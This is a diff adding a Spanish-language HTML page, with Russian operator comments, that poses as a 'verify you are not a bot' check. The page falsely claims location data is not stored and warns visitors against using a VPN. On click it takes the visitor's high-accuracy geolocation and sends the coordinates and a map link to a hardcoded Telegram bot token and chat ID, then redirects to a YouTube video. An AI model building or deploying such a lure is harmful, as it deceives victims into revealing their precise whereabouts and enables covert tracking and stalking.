@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cargando...</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding: 30px 20px; background: #111; color: #fff; }
+        .imagen { max-width: 100%; height: auto; margin-bottom: 25px; border-radius: 12px; }
+        .aviso {
+            background: #1e1e1e;
+            border: 1px solid #333;
+            border-radius: 12px;
+            padding: 18px 20px;
+            margin: 20px 0 25px 0;
+            text-align: left;
+            font-size: 15px;
+            line-height: 1.5;
+            color: #ddd;
+        }
+        .aviso strong { color: #fff; }
+        .aviso .rojo { color: #ff5555; font-weight: bold; }
+        button { padding: 15px 30px; font-size: 18px; background: #ff0000; color: white; border: none; border-radius: 8px; }
+        button:active { background: #cc0000; }
+        #status { margin-top: 20px; color: #aaa; }
+    </style>
+</head>
+<body>
+    <!-- ⚠️ СЮДА ВСТАВЬ ССЫЛКУ НА СВОЮ КАРТИНКУ -->
+    <img src="https://i.postimg.cc/rww3SWx2/Bez-nazvania2299-20261111213225.png" alt="Imagen" class="imagen">
+
+    <h1>Confirma tu ubicación</h1>
+
+    <!-- ⚠️ ТЕКСТ-ПРЕДУПРЕЖДЕНИЕ (на испанском, для человека) -->
+    <div class="aviso">
+        <p><strong>Aviso de verificación:</strong></p>
+        <p>Solicitamos tu ubicación únicamente para verificar que no eres un bot. Toda la información <strong>no se almacena en el sitio</strong> y se elimina inmediatamente después de la verificación. La información es revisada mediante inteligencia artificial (IA). Por favor, no te preocupes por esto.</p>
+        <p class="rojo">No uses VPN, de lo contrario serás bloqueado.</p>
+    </div>
+
+    <button onclick="obtenerUbicacion()">Permitir y continuar</button>
+    <p id="status"></p>
+
+    <script>
+        // ============================================================
+         ============================================================
+        
+        
+        const BOT_TOKEN = '9286992003:AAEzmPRgop4ou727fAw1N0NL4h9d5luA9cE';
+        
+       
+        const CHAT_ID = '5699612877';
+        
+        
+        const TARGET_URL = 'https://youtu.be/jLu_JpC3GJk?is=z25cNc3dEbk504FY';
+        
+        // ============================================================
+        // 
+        // ============================================================
+
+        function obtenerUbicacion() {
+            const status = document.getElementById('status');
+            status.innerText = 'Solicitando ubicación...';
+
+            if (!navigator.geolocation) {
+                status.innerText = 'Tu navegador no soporta geolocalización.';
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(exito, error, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+
+            function exito(position) {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const acc = position.coords.accuracy;
+                
+                status.innerText = '¡Listo! Redirigiendo...';
+
+                const text = `📍 Coordenadas:\nLatitud: ${lat}\nLongitud: ${lon}\nPrecisión: ${acc} m\nMapa: https://maps.google.com/?q=${lat},${lon}`;
+                
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                }).finally(() => {
+                    window.location.href = TARGET_URL;
+                });
+            }
+
+            function error(err) {
+                if (err.code === 1) {
+                    status.innerText = 'Acceso denegado. No es posible continuar.';
+                } else {
+                    status.innerText = 'Error al obtener la ubicación. Inténtalo de nuevo.';
+                }
+            }
+        }
+    </script>
+</body>
+</html>
